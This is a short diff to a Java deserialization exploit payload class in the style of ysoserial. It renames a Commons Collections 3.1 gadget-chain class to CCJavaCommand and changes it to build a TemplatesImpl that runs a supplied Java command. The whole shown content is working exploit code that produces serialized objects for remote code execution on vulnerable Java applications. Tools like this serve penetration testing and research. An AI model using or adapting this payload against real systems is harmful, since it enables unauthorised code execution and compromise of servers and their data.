@@ -28,10 +28,10 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 @SuppressWarnings({"rawtypes", "unchecked", "restriction"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @PayloadTest ( precondition = "isApplicableJavaVersion")
-public class SystemProperties extends PayloadRunner implements ObjectPayload<Object> {
+public class CCJavaCommand extends PayloadRunner implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
-		Object templatesImpl = Gadgets.createSysInfoTemplatesImpl(command);
+		Object templatesImpl = Gadgets.createJavaCommandTemplatesImpl(command);
 
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
@@ -57,7 +57,7 @@ public class SystemProperties extends PayloadRunner implements ObjectPayload<Obj
 	}
 
 	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(SystemProperties.class, args);
+		PayloadRunner.run(CCJavaCommand.class, args);
 	}
 	
 	public static boolean isApplicableJavaVersion() {
